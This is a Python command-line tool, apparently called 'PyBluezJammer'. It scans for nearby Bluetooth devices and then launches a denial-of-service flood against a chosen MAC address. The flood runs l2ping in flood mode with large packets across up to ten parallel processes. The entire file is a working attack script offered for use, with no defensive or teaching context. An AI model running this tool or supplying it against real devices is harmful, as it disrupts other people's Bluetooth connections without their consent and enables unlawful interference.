#!/usr/bin/env python3

import subprocess
import sys
import os
import re
from multiprocessing import Process, active_children

def check_root():
    if os.geteuid() != 0:
        print("[!] Run as root (e.g., sudo python3 bluetooth_jammer.py)")
        sys.exit(1)

def check_tools():
    required = ['hcitool', 'l2ping']
    missing = []
    for tool in required:
        result = subprocess.run(['which', tool], stdout=subprocess.PIPE)
        if not result.stdout:
            missing.append(tool)
    if missing:
        print(f"[!] Missing tools: {', '.join(missing)}. Install with: sudo apt install bluez")
        sys.exit(1)

def scan_devices(interface='hci0'):
    print("[*] Scanning for nearby Bluetooth devices...")
    cmd = ['hcitool', '-i', interface, 'scan']
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate(timeout=10)
        if proc.returncode != 0:
            print(f"[!] Scan failed: {stderr.decode().strip()}")
            return []
        devices = []
        for line in stdout.decode().splitlines():
            match = re.search(r'([0-9A-Fa-f:]{17})\s+(.*)', line.strip())
            if match:
                mac, name = match.groups()
                devices.append((mac, name))
        return devices
    except Exception as e:
        print(f"[!] Scan error: {str(e)}")
        return []

def l2ping_flood(target_mac, interface='hci0'):
    cmd = ['l2ping', '-i', interface, '-s', '600', '-f', target_mac]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        proc.wait()
    except:
        pass

def start_attack(target_mac, interface='hci0', workers=5):
    print(f"[*] Targeting {target_mac} with {workers} workers...")
    for _ in range(workers):
        p = Process(target=l2ping_flood, args=(target_mac, interface))
        p.start()

def stop_attack():
    print("[*] Stopping all attacks...")
    for child in active_children():
        child.terminate()

def main():
    check_root()
    check_tools()
    interface = 'hci0'
    
    while True:
        print("\nPyBluezJammer Menu:")
        print("1. Scan for devices")
        print("2. Start attack")
        print("3. Stop attacks")
        print("4. Exit")
        choice = input("> ").strip()
        
        if choice == '1':
            devices = scan_devices(interface)
            if devices:
                print("\nDiscovered Devices:")
                for i, (mac, name) in enumerate(devices, 1):
                    print(f"{i}. {mac} - {name}")
            else:
                print("[!] No devices found")
        
        elif choice == '2':
            target_mac = input("Enter target MAC: ").strip()
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', target_mac):
                print("[!] Invalid MAC address")
                continue
            workers = input("Number of workers [1-10]: ").strip()
            if not workers.isdigit() or not (1 <= int(workers) <= 10):
                print("[!] Use 1-10 workers")
                continue
            start_attack(target_mac, interface, int(workers))
        
        elif choice == '3':
            stop_attack()
        
        elif choice == '4':
            stop_attack()
            print("[*] Exiting...")
            break
        
        else:
            print("[!] Invalid choice")

if __name__ == "__main__":
    main()
